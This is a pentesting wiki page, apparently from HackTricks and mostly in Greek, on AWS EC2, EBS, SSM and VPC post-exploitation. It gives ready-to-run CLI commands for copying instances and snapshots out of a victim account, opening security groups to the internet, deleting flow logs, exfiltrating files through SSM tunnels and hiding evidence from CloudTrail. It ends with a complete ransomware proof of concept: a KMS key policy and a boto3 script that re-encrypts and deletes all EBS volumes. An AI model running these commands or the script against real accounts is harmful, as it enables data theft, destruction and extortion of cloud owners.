# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

Το VPC traffic mirroring **duplicates inbound and outbound traffic for EC2 instances within a VPC** χωρίς την ανάγκη εγκατάστασης οτιδήποτε στα ίδια τα instances.\
Αυτή η διπλασιασμένη κίνηση συνήθως αποστέλλεται σε κάτι σαν network intrusion detection system (IDS) για ανάλυση και παρακολούθηση.\
Ένας επιτιθέμενος θα μπορούσε να το εκμεταλλευτεί για να καταγράψει όλη την κίνηση και να αποκτήσει ευαίσθητες πληροφορίες από αυτή:

Για περισσότερες πληροφορίες δείτε αυτή τη σελίδα:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Τα instances συνήθως περιέχουν κάποιο είδος ευαίσθητων πληροφοριών. Υπάρχουν διάφοροι τρόποι για να αποκτήσετε πρόσβαση (δείτε [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Ωστόσο, ένας άλλος τρόπος για να ελέγξετε τι περιέχει είναι να **δημιουργήσετε ένα AMI και να τρέξετε ένα νέο instance (ακόμα και στον δικό σας λογαριασμό) από αυτό**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Τα Snapshots είναι αντίγραφα ασφαλείας των volumes**, τα οποία συνήθως περιέχουν **ευαίσθητες πληροφορίες**, επομένως ο έλεγχός τους πιθανόν να τις αποκαλύψει.\
Αν βρείτε ένα **volume χωρίς snapshot** μπορείτε: **Create a snapshot** και να εκτελέσετε τις ακόλουθες ενέργειες ή απλώς **mount it in an instance** μέσα στον λογαριασμό:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Εξάγετε ένα EC2 AMI κατευθείαν στο S3 χρησιμοποιώντας `CreateStoreImageTask` για να αποκτήσετε ένα raw disk image χωρίς κοινή χρήση snapshot. Αυτό επιτρέπει πλήρη offline forensics ή data theft ενώ το instance networking παραμένει ανέπαφο.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Συνδέστε έναν io1/io2 Multi-Attach volume σε δεύτερο instance και mount-άρετέ τον σε read-only για να αποσπάσετε live data χωρίς snapshots. Χρήσιμο όταν ο victim volume έχει ήδη ενεργοποιημένο Multi-Attach στην ίδια AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Δημιουργήστε ένα EC2 Instance Connect Endpoint, επιτρέψτε ingress και εγχύστε ephemeral SSH keys για πρόσβαση σε private instances μέσω managed tunnel. Παρέχει γρήγορες lateral movement διαδρομές χωρίς να ανοίγονται public ports.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Μετακινήστε τη secondary private IP ενός victim ENI σε ENI υπό έλεγχο attacker για να μιμηθείτε trusted hosts που είναι allowlisted κατά IP. Επιτρέπει την παράκαμψη εσωτερικών ACLs ή SG rules που βασίζονται σε συγκεκριμένες διευθύνσεις.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Επανασυσχετίστε ένα Elastic IP από το victim instance στον attacker για να υποκλέψετε inbound traffic ή να ξεκινήσετε outbound συνδέσεις που φαίνονται να προέρχονται από trusted public IPs.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Αν ένας κανόνας security group αναφέρεται σε έναν customer-managed prefix list, η προσθήκη attacker CIDRs στη λίστα επεκτείνει σιωπηλά την πρόσβαση σε κάθε εξαρτώμενο SG rule χωρίς να τροποποιηθεί το ίδιο το SG.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Δημιουργήστε gateway ή interface VPC endpoints για να επανακτήσετε outbound access από απομονωμένα subnets. Η αξιοποίηση AWS-managed private links παρακάμπτει την έλλειψη IGW/NAT controls για data exfiltration.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

Ένας attacker με permission ec2:AuthorizeSecurityGroupIngress μπορεί να προσθέσει inbound rules σε security groups (π.χ. επιτρέποντας tcp:80 από 0.0.0.0/0), εκθέτοντας έτσι internal υπηρεσίες στο δημόσιο Internet ή σε μη εξουσιοδοτημένα δίκτυα.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Ένας επιτιθέμενος με δικαιώματα ec2:ReplaceNetworkAclEntry (ή παρόμοια) μπορεί να τροποποιήσει τα Network ACLs (NACLs) ενός subnet ώστε να τα καταστήσει πολύ πιο επιεική — για παράδειγμα επιτρέποντας 0.0.0.0/0 σε κρίσιμες θύρες — εκθέτοντας όλο το εύρος του subnet στο Internet ή σε μη εξουσιοδοτημένα τμήματα του δικτύου. Σε αντίθεση με τα Security Groups, που εφαρμόζονται ανά instance, τα NACLs εφαρμόζονται σε επίπεδο subnet, οπότε η αλλαγή ενός περιοριστικού NACL μπορεί να έχει πολύ μεγαλύτερη εμβέλεια, επιτρέποντας πρόσβαση σε πολλούς περισσότερους hosts.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Ένας attacker με δικαιώματα ec2:Delete* και iam:Remove* μπορεί να διαγράψει κρίσιμους πόρους υποδομής και ρυθμίσεις — για παράδειγμα key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Αυτό μπορεί να προκαλέσει άμεση διακοπή υπηρεσίας, απώλεια δεδομένων και απώλεια εγκληματολογικών αποδείξεων.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Κατευθύνετε τα VPC Flow Logs σε ένα attacker-controlled S3 bucket για να συλλέγετε συνεχώς network metadata (source/destination, ports) εκτός του victim account για μακροχρόνια reconnaissance.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Even if you lock down an EC2 so no traffic can get out, it can still **exfil via DNS**.

- **VPC Flow Logs δεν θα το καταγράψουν.**
- Δεν έχετε πρόσβαση στα AWS DNS logs.
- Απενεργοποιήστε αυτό ορίζοντας "enableDnsSupport" σε false με:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Ένας attacker θα μπορούσε να καλέσει API endpoints ενός account που ελέγχει. Το Cloudtrail θα καταγράψει αυτές τις κλήσεις και ο attacker θα μπορεί να δει τα exfiltrate δεδομένα στα Cloudtrail logs.

### Open Security Group

Μπορείτε να αποκτήσετε περαιτέρω πρόσβαση σε network services ανοίγοντας ports όπως το εξής:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc σε ECS

Είναι δυνατό να τρέξεις ένα EC2 instance και να το καταχωρήσεις ώστε να χρησιμοποιηθεί για την εκτέλεση ECS instances και στη συνέχεια να κλέψεις τα δεδομένα των ECS instances.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Αφαίρεση VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Required permissions:

- `ssm:StartSession`

Εκτός από την εκτέλεση εντολών, το SSM επιτρέπει traffic tunneling το οποίο μπορεί να καταχραστεί για pivot από EC2 instances που δεν έχουν πρόσβαση στο δίκτυο λόγω Security Groups ή NACLs.
Ένα από τα σενάρια όπου αυτό είναι χρήσιμο είναι το pivot από έναν [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) προς ένα ιδιωτικό EKS cluster.

> Για να ξεκινήσετε μια συνεδρία χρειάζεστε εγκατεστημένο το SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Εγκαταστήστε το SessionManagerPlugin στον υπολογιστή σας
2. Συνδεθείτε στο Bastion EC2 χρησιμοποιώντας την ακόλουθη εντολή:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Πάρε τα προσωρινά AWS credentials του Bastion EC2 με το script [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Μετάφερε τα credentials στη δική σου μηχανή στο αρχείο `$HOME/.aws/credentials` ως προφίλ `[bastion-ec2]`
5. Συνδέσου στο EKS ως το Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Ενημερώστε το πεδίο `server` στο αρχείο `$HOME/.kube/config` ώστε να δείχνει στο `https://localhost`
7. Δημιουργήστε ένα SSM tunnel ως εξής:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Η κίνηση από το `kubectl` προωθείται τώρα μέσω του SSM tunnel μέσω του Bastion EC2 και μπορείτε να αποκτήσετε πρόσβαση στο ιδιωτικό EKS cluster από τον δικό σας υπολογιστή εκτελώντας:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Σημειώστε ότι οι συνδέσεις SSL θα αποτύχουν εκτός αν ορίσετε την παράμετρο `--insecure-skip-tls-verify ` (ή το αντίστοιχό της σε εργαλεία audit του K8s). Δεδομένου ότι η κυκλοφορία διοχετεύεται μέσω του ασφαλούς AWS SSM tunnel, είστε προστατευμένοι από οποιονδήποτε τύπο MitM επιθέσεων.

Τέλος, αυτή η τεχνική δεν είναι ειδική για επίθεση σε ιδιωτικά EKS clusters. Μπορείτε να ορίσετε αυθαίρετους τομείς και θύρες για να pivot σε οποιαδήποτε άλλη AWS υπηρεσία ή σε μια προσαρμοσμένη εφαρμογή.

---

#### Γρήγορο Τοπικό ↔️ Απομακρυσμένο Port Forward (AWS-StartPortForwardingSession)

Αν χρειάζεται μόνο να προωθήσετε **μία TCP θύρα από το EC2 instance στον τοπικό σας υπολογιστή** μπορείτε να χρησιμοποιήσετε το `AWS-StartPortForwardingSession` SSM document (δεν απαιτείται παράμετρος απομακρυσμένου host):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Η εντολή δημιουργεί ένα αμφίδρομο tunnel μεταξύ του workstation σας (`localPortNumber`) και της επιλεγμένης θύρας (`portNumber`) στην instance **χωρίς να ανοίγει εισερχόμενους κανόνες Security-Group**.

Common use cases:

* **File exfiltration**
1. Στην instance ξεκινήστε έναν γρήγορο HTTP server που δείχνει στον κατάλογο που θέλετε να exfiltrate:

```bash
python3 -m http.server 8000
```

2. Από το workstation σας ανακτήστε τα αρχεία μέσω του SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Πρόσβαση σε εσωτερικές web εφαρμογές (π.χ. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Συμβουλή: Συμπιέστε και κρυπτογραφήστε τα αποδεικτικά στοιχεία πριν την εξαγωγή τους, ώστε το CloudTrail να μην καταγράφει το clear-text περιεχόμενο:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Κοινή χρήση AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Αναζήτηση ευαίσθητων πληροφοριών σε δημόσια και ιδιωτικά AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): Το CloudShovel είναι ένα εργαλείο σχεδιασμένο για **αναζήτηση ευαίσθητων πληροφοριών σε δημόσια ή ιδιωτικά Amazon Machine Images (AMIs)**. Αυτοματοποιεί τη διαδικασία του launching instances από στοχευμένα AMIs, το mounting των volumes τους, και το scanning για potential secrets ή ευαίσθητα δεδομένα.

### Κοινή χρήση EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Μια proof of concept παρόμοια με την επίδειξη Ransomware που παρουσιάζεται στις σημειώσεις post-exploitation για το S3. Το KMS θα έπρεπε να ονομαστεί RMS για Ransomware Management Service, δεδομένης της ευκολίας με την οποία μπορεί να χρησιμοποιηθεί για να κρυπτογραφήσει διάφορες υπηρεσίες AWS.

Πρώτα, από έναν 'attacker' AWS λογαριασμό, δημιουργήστε ένα customer managed key στο KMS. Για αυτό το παράδειγμα θα αφήσουμε το AWS να διαχειρίζεται τα δεδομένα του κλειδιού για εμάς, αλλά σε ένα ρεαλιστικό σενάριο ένας κακόβουλος παράγοντας θα διατηρούσε τα δεδομένα του κλειδιού εκτός του ελέγχου του AWS. Αλλάξτε την πολιτική του κλειδιού ώστε να επιτρέπει σε οποιονδήποτε AWS account Principal να χρησιμοποιήσει το κλειδί. Για αυτήν την πολιτική κλειδιού, το όνομα του λογαριασμού ήταν 'AttackSim' και ο κανόνας πολιτικής που επιτρέπει πλήρη πρόσβαση ονομάζεται 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Ο κανόνας πολιτικής του key πρέπει να έχει ενεργοποιημένα τα παρακάτω για να επιτρέπει τη χρήση του για κρυπτογράφηση ενός EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Τώρα, έχοντας διαθέσιμο το δημόσια προσβάσιμο key. Μπορούμε να χρησιμοποιήσουμε έναν λογαριασμό 'victim' που έχει μερικά EC2 instances ενεργοποιημένα με μη κρυπτογραφημένα EBS volumes συνδεδεμένα. Τα EBS volumes αυτού του 'victim' λογαριασμού είναι ο στόχος μας για κρυπτογράφηση — αυτή η επίθεση γίνεται υπό την υπόθεση παραβίασης ενός AWS λογαριασμού με υψηλά προνόμια.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Παρόμοιο με το παράδειγμα S3 ransomware. Αυτή η επίθεση θα δημιουργήσει αντίγραφα των συνδεδεμένων EBS volumes χρησιμοποιώντας snapshots, θα χρησιμοποιήσει το δημόσια διαθέσιμο key από τον λογαριασμό 'attacker' για να κρυπτογραφήσει τα νέα EBS volumes, στη συνέχεια θα αποσυνδέσει τα αρχικά EBS volumes από τα EC2 instances και θα τα διαγράψει, και τέλος θα διαγράψει τα snapshots που χρησιμοποιήθηκαν για τη δημιουργία των νέων κρυπτογραφημένων EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Το αποτέλεσμα είναι ότι στον λογαριασμό παραμένουν μόνο κρυπτογραφημένα EBS volumes.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Αξίζει επίσης να σημειωθεί ότι το script σταμάτησε τα EC2 instances για να αποσυνδέσει και να διαγράψει τα αρχικά EBS volumes. Τα αρχικά μη κρυπτογραφημένα volumes έχουν πλέον εξαφανιστεί.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Έπειτα, επιστρέψτε στην key policy στον λογαριασμό 'attacker' και αφαιρέστε τον κανόνα πολιτικής 'Outside Encryption' από την key policy.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Περιμένετε λίγο ώστε η νεορυθμισμένη key policy να διαδοθεί. Στη συνέχεια επιστρέψτε στον λογαριασμό 'victim' και προσπαθήστε να επισυνάψετε έναν από τους πρόσφατα κρυπτογραφημένους EBS volumes. Θα διαπιστώσετε ότι μπορείτε να επισυνάψετε τον όγκο.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Αλλά όταν προσπαθήσετε πραγματικά να εκκινήσετε ξανά το EC2 instance με το κρυπτογραφημένο EBS volume, θα αποτύχει και θα επιστρέψει από την κατάσταση 'pending' στην κατάσταση 'stopped' επ’ αόριστον, καθώς ο επισυναπτόμενος EBS volume δεν μπορεί να αποκρυπτογραφηθεί με το key επειδή η key policy πλέον δεν το επιτρέπει.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Αυτό είναι το python script που χρησιμοποιήθηκε. Παίρνει AWS creds για έναν λογαριασμό 'victim' και μια δημόσια διαθέσιμη AWS ARN τιμή για το key που θα χρησιμοποιηθεί για την κρυπτογράφηση. Το script θα δημιουργήσει κρυπτογραφημένα αντίγραφα ΟΛΩΝ των διαθέσιμων EBS volumes που είναι επισυναπτόμενα σε ΟΛΑ τα EC2 instances στον στοχευόμενο AWS λογαριασμό, έπειτα θα σταματήσει κάθε EC2 instance, θα αποσυνδέσει τα αρχικά EBS volumes, θα τα διαγράψει, και τέλος θα διαγράψει όλα τα snapshots που χρησιμοποιήθηκαν κατά τη διαδικασία. Αυτό θα αφήσει μόνο κρυπτογραφημένα EBS volumes στον στοχευόμενο λογαριασμό 'victim'. ΧΡΗΣΙΜΟΠΟΙΗΣΤΕ ΑΥΤΟ ΤΟ SCRIPT ΜΟΝΟ ΣΕ ΠΕΡΙΒΑΛΛΟΝ ΔΟΚΙΜΩΝ, ΕΙΝΑΙ ΚΑΤΑΣΤΡΟΦΙΚΟ ΚΑΙ ΘΑ ΔΙΑΓΡΑΨΕΙ ΟΛΑ ΤΑ ΑΡΧΙΚΑ EBS VOLUMES. Μπορείτε να τα ανακτήσετε χρησιμοποιώντας το χρησιμοποιημένο KMS key και να τα επαναφέρετε στην αρχική τους κατάσταση μέσω snapshots, αλλά απλώς θέλω να είστε ενήμεροι ότι αυτό είναι ένα ransomware PoC στο τέλος της ημέρας.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Αναφορές

- [Pentest Partners – Πώς να μεταφέρετε αρχεία στο AWS χρησιμοποιώντας SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
